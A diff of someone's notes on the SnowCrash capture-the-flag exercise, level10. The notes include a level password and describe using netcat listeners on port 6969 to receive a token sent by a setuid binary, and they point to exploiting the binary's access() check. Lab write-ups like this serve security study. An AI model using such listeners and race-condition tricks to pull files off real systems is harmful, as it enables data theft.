@@ -9,7 +9,7 @@ pass : s5cAJpM8ev6XHw998pRWG728z
 ### level10
 - The binary takes 2 args, a file to send and an host
 - He create a connection on port 6969 and send the file if we have perms
-    - we can use nc to create a server on our machine ```nc -l -p 6969``` | ```nc -l 6969```
+    - we can use nc to create a server on our machine or on snowcrash ```nc -l -p 6969``` | ```nc -l 6969```
     - then ```./level10 file/to/send my_machine_ip```
       - it works, now we must find a way to send token ; ln does not work
       - we use decompiler and see the use of access ==> which can be exploit
